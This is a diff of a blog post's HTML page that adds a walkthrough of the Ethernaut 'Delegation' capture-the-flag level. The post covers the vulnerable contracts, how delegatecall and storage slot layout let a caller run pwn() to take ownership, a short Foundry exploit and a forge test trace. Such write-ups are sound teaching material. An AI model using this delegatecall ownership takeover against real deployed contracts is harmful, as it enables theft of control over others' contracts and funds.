@@ -9,22 +9,22 @@
 
 
 <meta name="author" content="Vasiliy Yorkin">
-<meta name="description" content="The goals is to claim the ownership of the.
-Analysis Exploit Key takeaways References Delegatecall from Solidity by Example. Delegatecall / Callcode and Libraries from the Solidity docs. ">
+<meta name="description" content="The goals is to claim the ownership of the Delegate contract.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract Delegate { address public owner; constructor(address _owner) { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result, ) = address(delegate).delegatecall(msg.data); if (result) { this; } } } Analysis We have two contracts: the Delegate and the Delegation.">
 <meta name="keywords" content="Vasiliy Yorkin">
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="CTF walkthrough, Ethernaut, #7 Delegation"/>
-<meta name="twitter:description" content="The goals is to claim the ownership of the.
-Analysis Exploit Key takeaways References Delegatecall from Solidity by Example. Delegatecall / Callcode and Libraries from the Solidity docs. "/>
+<meta name="twitter:description" content="The goals is to claim the ownership of the Delegate contract.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract Delegate { address public owner; constructor(address _owner) { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result, ) = address(delegate).delegatecall(msg.data); if (result) { this; } } } Analysis We have two contracts: the Delegate and the Delegation."/>
 
 <meta property="og:title" content="CTF walkthrough, Ethernaut, #7 Delegation" />
-<meta property="og:description" content="The goals is to claim the ownership of the.
-Analysis Exploit Key takeaways References Delegatecall from Solidity by Example. Delegatecall / Callcode and Libraries from the Solidity docs. " />
+<meta property="og:description" content="The goals is to claim the ownership of the Delegate contract.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract Delegate { address public owner; constructor(address _owner) { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result, ) = address(delegate).delegatecall(msg.data); if (result) { this; } } } Analysis We have two contracts: the Delegate and the Delegation." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-7-delegation/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-07-28T17:01:00+03:00" />
-<meta property="article:modified_time" content="2022-07-28T17:01:00+03:00" />
+<meta property="article:published_time" content="2022-07-29T13:18:00+03:00" />
+<meta property="article:modified_time" content="2022-07-29T13:18:00+03:00" />
 
 
 
@@ -151,8 +151,8 @@ Analysis Exploit Key takeaways References Delegatecall from Solidity by Example.
           <div class="date">
             <span class="posted-on">
               <i class="fa fa-calendar" aria-hidden="true"></i>
-              <time datetime="2022-07-28T17:01:00&#43;03:00">
-                July 28, 2022
+              <time datetime="2022-07-29T13:18:00&#43;03:00">
+                July 29, 2022
               </time>
             </span>
           </div>
@@ -186,38 +186,192 @@ Analysis Exploit Key takeaways References Delegatecall from Solidity by Example.
 
       <div>
         
-        <p>The goals is to claim the ownership of the.</p>
-<h2 id="analysis">
+        <p>The goals is to claim the ownership of the <code>Delegate</code> contract.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">8</span>.<span style="color:#00d;font-weight:bold">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Delegate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">constructor</span>(<span style="color:#888;font-weight:bold">address</span> _owner) {
+</span></span><span style="display:flex;"><span>        owner = _owner;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">pwn</span>() <span style="color:#080;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#038">msg</span>.<span style="color:#038">sender</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Delegation</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">public</span> owner;
+</span></span><span style="display:flex;"><span>    Delegate delegate;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">constructor</span>(<span style="color:#888;font-weight:bold">address</span> _delegateAddress) {
+</span></span><span style="display:flex;"><span>        delegate = Delegate(_delegateAddress);
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#038">msg</span>.<span style="color:#038">sender</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fallback() <span style="color:#080;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>        (<span style="color:#888;font-weight:bold">bool</span> result, ) = <span style="color:#888;font-weight:bold">address</span>(delegate).<span style="color:#038">delegatecall</span>(<span style="color:#038">msg</span>.<span style="color:#038">data</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> (result) {
+</span></span><span style="display:flex;"><span>            <span style="color:#038">this</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="analysis">
   Analysis
   <a class="heading-link" href="#analysis">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<h2 id="exploit">
+<p>We have two contracts: the <code>Delegate</code> and the <code>Delegation</code>.</p>
+<p><strong>Delegate</strong></p>
+<ul>
+<li>It has an <code>owner</code> that was set in the constructor.</li>
+<li>The <code>pwn()</code> public function can be used to change the ownership to the <code>msg.sender</code>.</li>
+</ul>
+<p><strong>Delegation</strong></p>
+<ul>
+<li>It keeps a reference to the <code>delegate</code> instance.</li>
+<li>Its <code>fallback</code> function calls a <code>delegatecall(msg.data)</code> on
+the <code>delegate</code> instance.</li>
+</ul>
+<p>There are a few differences between a simple message-<code>call</code> and
+a <code>delegatecall</code>. The <code>delegatecall</code> is a
+<a href="https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries">special
+variant of a message call</a>, which executes the code at the
+target address in the context of the calling contract. The
+<code>msg.sender</code>, <code>msg.data</code> and <code>msg.value</code> are preserved. This
+makes it possible to use other contracts as libraries.</p>
+<div class="mermaid">
+%%{init: {'theme':'base'}}%%
+sequenceDiagram
+    participant E as Exploit
+    participant D1 as Delegation
+    participant D2 as Delegate
+    E-&gt;&gt;D1: call(abi.encodeWithSignature("pwn()"))
+    D1-&gt;&gt;D1: fallback()
+    D1-&gt;&gt;D2: delegatecall(msg.data)
+    Note right of D1: msg.data = "pwn()"
+    Note right of D1: msg.sender = Exploit
+    Note right of D2: msg.sender = Exploit
+    D2-&gt;&gt;D2: owner = msg.sender
+
+</div>
+
+
+<p>The <code>msg.data</code> should be an ABI-encoded function signature. This
+could be done by using either of the following functions:</p>
+<ul>
+<li><code>abi.encodeWithSelector(bytes4 selector, ...)</code></li>
+<li><code>abi.encodeWithSignature(string memory signature, ...)</code></li>
+</ul>
+<p>The EVM stores state (storage) variables in slots in the order
+they are defined in a contract. Because in both contracts the
+<code>owner</code> state variable is defined first (assigned to <code>slot 0</code>),
+it is possible call the <code>pwn()</code> function to change its value.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Delegate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">public</span> owner; <span style="color:#888">// slot = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>    <span style="color:#888">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Delegation</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">public</span> owner; <span style="color:#888">// slot = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>    Delegate delegate;    <span style="color:#888">// slot = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>    <span style="color:#888">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>}
+</span></span></code></pre></div><h2 id="exploit">
   Exploit
   <a class="heading-link" href="#exploit">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<h2 id="key-takeaways">
-  Key takeaways
-  <a class="heading-link" href="#key-takeaways">
-    <i class="fa fa-link" aria-hidden="true"></i>
-  </a>
-</h2>
-<h2 id="references">
+<p>The explot</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">exploit</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    vm.startPrank(player);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">bytes</span> <span style="color:#080;font-weight:bold">memory</span> <span style="color:#038">data</span> = <span style="color:#038">abi</span>.<span style="color:#038">encodeWithSelector</span>(Delegate.pwn.<span style="color:#038">selector</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">address</span>(level).<span style="color:#038">call</span>(<span style="color:#038">data</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Or the equivalent:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-weight:bold">bytes</span> <span style="color:#080;font-weight:bold">memory</span> <span style="color:#038">data</span> = <span style="color:#038">abi</span>.<span style="color:#038">encodeWithSignature</span>(<span style="color:#d20;background-color:#fff0f0">&#34;pwn()&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#888;font-weight:bold">address</span>(level).<span style="color:#038">call</span>(<span style="color:#038">data</span>)
+</span></span></code></pre></div><p>The trace:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#038">test</span> --match-contract DelegationTest -vvvv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#00d;font-weight:bold">1</span> <span style="color:#038">test</span> <span style="color:#080;font-weight:bold">for</span> src/test/Delegation.t.sol:DelegationTest
+</span></span><span style="display:flex;"><span>[PASS] testDelegation() (gas: 248446)
+</span></span><span style="display:flex;"><span>Traces:
+</span></span><span style="display:flex;"><span>  [248446] DelegationTest::testDelegation()
+</span></span><span style="display:flex;"><span>    ├─ [191772] DelegationTest::create()
+</span></span><span style="display:flex;"><span>    │   ├─ [0] VM::prank(player: [...])
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   ├─ [179424] Ethernaut::createLevelInstance(DelegationFactory: [...])
+</span></span><span style="display:flex;"><span>    │   │   ├─ [127861] DelegationFactory::createInstance(player: [...])
+</span></span><span style="display:flex;"><span>    │   │   │   ├─ [93165] → new Delegation@<span style="color:#d20;background-color:#fff0f0">&#34;0x566b…cc21&#34;</span>
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#00d;font-weight:bold">243</span> bytes of code
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Delegation: [...]
+</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [...], instance: Delegation: [...])
+</span></span><span style="display:flex;"><span>    │   │   └─ ← Delegation: [...]
+</span></span><span style="display:flex;"><span>    │   └─ ← Delegation: [...]
+</span></span><span style="display:flex;"><span>    ├─ [303] Delegation::owner() [staticcall]
+</span></span><span style="display:flex;"><span>    │   └─ ← DelegationFactory: [...]
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [3350] Delegation::pwn()
+</span></span><span style="display:flex;"><span>    │   ├─ [367] Delegate::pwn() [delegatecall]
+</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [4346] Ethernaut::submitLevelInstance(Delegation: [...])
+</span></span><span style="display:flex;"><span>    │   ├─ [1299] DelegationFactory::validateInstance(Delegation: [...], player: [...])
+</span></span><span style="display:flex;"><span>    │   │   ├─ [303] Delegation::owner() [staticcall]
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: [...]
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [...], level: DelegationFactory: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    └─ ← ()
+</span></span></code></pre></div><p>Note that if the order of the state variables were different in the
+<code>Delegation</code> contract then this would not work:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Delegation</span> {
+</span></span><span style="display:flex;"><span>    Delegate delegate;     <span style="color:#888">// slot = 0
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>    <span style="color:#888;font-weight:bold">address</span> <span style="color:#080;font-weight:bold">public</span> owner;  <span style="color:#888">// slot = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>    <span style="color:#888">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span>}
+</span></span></code></pre></div><h2 id="references">
   References
   <a class="heading-link" href="#references">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
 <ul>
+<li><a href="https://solidity-by-example.org/call/">Call</a> from Solidity
+by Example.</li>
 <li><a href="https://solidity-by-example.org/delegatecall/">Delegatecall</a> from Solidity by Example.</li>
 <li><a href="https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries">Delegatecall
-/ Callcode and Libraries</a> from the Solidity docs.</li>
+/ Callcode and Libraries</a> from Solidity docs.</li>
+<li><a href="https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage">Layout
+of State Variables in Storage</a> from Solidity docs.</li>
 </ul>
 <hr>
+<p>Code for this step is in branch
+<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-7/src/test/Delegation.t.sol">step-7</a>.</p>
+<p>Let&rsquo;s continue to the next challenge:
+<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-8-force">CTF walkthrough,
+Ethernaut, #8 Force</a>!</p>
 
+        
+        <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+        <script>
+            mermaid.initialize({ startOnLoad: true });
+        </script>
         
       </div>
 
